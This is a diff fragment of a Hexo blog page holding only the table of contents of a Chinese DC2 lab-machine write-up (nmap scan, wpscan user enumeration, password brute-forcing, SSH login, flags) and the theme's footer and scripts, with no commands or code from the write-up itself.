+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC2-%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95"><span class="toc-text">DC2 靶机记录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA%E7%9C%81%E7%95%A5"><span class="toc-text">主机发现 内网其他主机省略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%9F%A5%E7%9C%8B%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-text">nmap查看相关信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%BA%86%E5%AF%86%E7%A0%81%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8wpscan%E6%9F%A5%E6%89%BE%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-text">有了密码尝试使用wpscan查找用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81-%E6%96%B9%E6%B3%95%E4%B8%8D%E5%94%AF%E4%B8%80-wpscan-burpsuite-hydra"><span class="toc-text">尝试爆破密码(方法不唯一:wpscan&#x2F;burpsuite&#x2F;hydra..)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag2"><span class="toc-text">寻找flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8tom-amp-jerry%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95ssh"><span class="toc-text">使用tom&amp;jerry账号登录ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ls%E5%8F%91%E7%8E%B0flag3"><span class="toc-text">ls发现flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final-flag"><span class="toc-text">final_flag</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/17year">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
